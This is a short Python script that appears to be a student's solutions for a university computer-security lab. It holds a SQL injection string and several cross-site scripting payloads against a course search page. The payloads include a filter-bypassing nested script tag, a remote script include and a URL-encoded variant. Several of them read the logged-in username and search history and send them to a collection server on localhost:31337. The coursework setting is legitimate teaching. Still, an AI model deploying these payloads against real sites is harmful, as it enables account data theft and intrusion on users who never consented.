sql = "SELECT * FROM `users` WHERE location='{}'"
injection = "'||1-- "
# print(sql.format(injection))

# 2720204f522027792720203d20202779 # A potential md5 hash that may be translated to what we want?
# 0dd214be0b9bbbbde2a8d56231626318

import urllib.parse as parse

xss_0 = """
<script>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</script>
"""

xss_1 = """
<scrscriptipt>
  $(function() {
    var username = window.document.getElementById("logged-in-user").innerHTML;
    var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
    $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
  });
</scrscriptipt>
"""

xss_3 = """
<scrscriptipt src=https://combinatronics.com/miyo6032/Computer-Security/master/Project%202/payload.js></scrscriptipt>
"""

q = """<script>++++++%24.get%28"https%3A%2F%2Fproject2.ecen4133.org%2Fsearch%3Fxssdefense%3D0"%2C+function+%28data%29+%7B++++++++++re+%3D+%2F<span+id%3D"logged-in-user">.*<%5C%2Fspan>%2F%3B++++++++++var+results+%3D+re.exec%28data%29%3B++++++++++var+username+%3D+re.exec%28data%29%5B0%5D.replace%28%27<span+id%3D"logged-in-user">%27%2C+%27%27%29.replace%28%27<%5C%2Fspan>%27%2C+%27%27%29%3B++++++++++re+%3D+%2F<a+href%3D"search%5C%3Fq%3D.*<%5C%2Fa>%2Fm%3B+data+%3D+data.replace%28re%2C+%27%27%29%3B+results+%3D+re.exec%28data%29%3B++++++++++var+last_search+%3D+results%5B0%5D.replace%28%2F<a+href%3D"search%5C%3Fq%3D.*class%3D"history-item+list-group-item">%2Fm%2C+%27%27%29.replace%28%27<%5C%2Fa>%27%2C+%27%27%29%3B++++++++++%24.get%28"http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D"+%2B+username+%2B+"%26last_search%3D"+%2B+last_search%2C+function+%28data%29+%7B+%7D%29%3B++++++%7D%29%3B++<%2Fscript>"""

print("https://project2.ecen4133.org/search?xssdefense=1&q=" + parse.quote_plus(xss_3))